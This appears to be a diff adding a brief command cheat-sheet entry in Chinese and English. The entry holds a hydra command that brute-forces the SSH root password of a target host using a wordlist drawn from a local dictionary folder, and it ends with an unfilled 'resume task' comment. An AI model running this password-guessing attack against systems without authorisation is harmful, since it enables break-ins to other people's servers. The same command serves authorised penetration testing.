@@ -1,0 +1,8 @@
+% tool, linux
+
+# 爆破 ssh  brute ssh
+hydra -l root -P <wordlist> ssh://$TARGET_IP
+
+$ wordlist: fd . "$HOME/dict" ---
+
+; 恢复任务 reusme task
